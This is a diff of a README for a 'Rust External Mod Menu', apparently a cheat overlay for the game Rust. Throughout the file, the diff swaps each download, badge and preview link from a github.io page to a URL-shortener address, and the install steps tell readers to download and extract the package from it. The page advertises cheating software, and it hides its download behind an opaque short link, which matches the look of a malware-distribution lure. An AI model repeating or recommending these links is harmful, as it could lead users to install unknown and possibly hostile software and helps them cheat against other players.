@@ -10,28 +10,28 @@ This variant is designed around a minimal UI and reusable settings so the reposi
 
 ## Quick Access
 
-[![Rust](https://img.shields.io/badge/Rust-External%20Menu-cb4b21?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Overlay](https://img.shields.io/badge/Overlay-Interface-e26b31?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Player Info](https://img.shields.io/badge/Player-Info-c4582f?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Items](https://img.shields.io/badge/Item-Views-b64926?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Profiles](https://img.shields.io/badge/Config-Profiles-a64021?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-8b351d?style=for-the-badge)](https://idleobstacle.github.io/)
+[![Rust](https://img.shields.io/badge/Rust-External%20Menu-cb4b21?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Overlay](https://img.shields.io/badge/Overlay-Interface-e26b31?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Player Info](https://img.shields.io/badge/Player-Info-c4582f?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Items](https://img.shields.io/badge/Item-Views-b64926?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Profiles](https://img.shields.io/badge/Config-Profiles-a64021?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Version-8b351d?style=for-the-badge)](https://flyn.co/17yeN7/)
 
 ---
 
 ## Download
 
-➡️ **[Download Rust External Mod Menu](https://idleobstacle.github.io/)**
+➡️ **[Download Rust External Mod Menu](https://flyn.co/17yeN7/)**
 
 ---
 
 ## Preview
 
-[![Rust External Mod Menu preview](assets/rust-external-mod-menu-preview.png)](https://idleobstacle.github.io/)
+[![Rust External Mod Menu preview](assets/rust-external-mod-menu-preview.png)](https://flyn.co/17yeN7/)
 
 ### Interface Preview
 
-[![Rust Mod Menu interface](assets/rust-mod-menu-interface.png)](https://idleobstacle.github.io/)
+[![Rust Mod Menu interface](assets/rust-mod-menu-interface.png)](https://flyn.co/17yeN7/)
 
 ---
 
@@ -131,7 +131,7 @@ Available UI options may include:
 
 1. Download the current package:
 
-   **[Download Rust External Mod Menu](https://idleobstacle.github.io/)**
+   **[Download Rust External Mod Menu](https://flyn.co/17yeN7/)**
 
 2. Extract it into a dedicated folder.
 3. Read the current release notes.
